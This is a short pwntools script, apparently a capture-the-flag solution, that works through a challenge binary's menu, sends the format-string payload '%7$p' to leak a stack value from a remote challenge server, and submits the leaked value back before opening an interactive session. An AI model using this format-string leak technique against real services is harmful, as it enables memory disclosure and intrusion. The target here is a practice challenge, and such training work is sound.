from pwn import *

elf = ELF("./vuln")

#p = elf.process()

p = remote("fun.chall.seetf.sg", 50001)

#raw_input("DEBUG")

payload = b"%7$p"

p.sendline(b"pengu")
sleep(0.1)
p.sendline(b"1")

sleep(0.1) 
p.sendline(b"123")

sleep(0.1)
p.sendline(b"1")

sleep(0.1) 
p.sendline(b"123")

sleep(0.1)
p.sendline(b"1")

sleep(0.1) 
p.sendline(b"123")

sleep(0.1)
p.sendline(b"1")

sleep(0.1) 
p.sendline(b"123")

sleep(0.1)
p.sendline(b"2")

p.sendlineafter("Whats your favourite format of CTFs?\n",payload)

p.recvuntil("Same! I love \n")
a = p.recvuntil("too!\n", drop = True)

log.info(a)
a = int(a,16)
print(a)

p.sendline(b"5")

sleep(0.1) 
p.sendline(str(a))

p.interactive()
